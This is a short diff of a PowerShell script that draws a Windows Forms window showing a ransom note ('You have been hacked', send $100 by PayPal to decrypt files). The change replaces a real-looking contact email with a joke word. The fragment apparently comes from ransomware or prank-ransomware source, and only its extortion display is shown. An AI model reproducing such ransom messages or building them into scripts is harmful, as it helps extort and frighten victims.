@@ -121,7 +121,7 @@ $label.AutoSize = $true
 $label.Location = New-Object System.Drawing.Point(60, 200)
 
 $label2 = New-Object Windows.Forms.Label
-$label2.Text = " You have been hacked !! `n`n`n Send 100$ to this paypal : salvator883@proton.me and we will decrypt all your files now `n`n`n Written by a Very good hacker"
+$label2.Text = " You have been hacked !! `n`n`n Send 100$ to this paypal : lmao and we will decrypt all your files now `n`n`n Written by a Very good hacker"
 $label2.AutoSize = $true
 $label2.Location = New-Object System.Drawing.Point(60, 280)
 
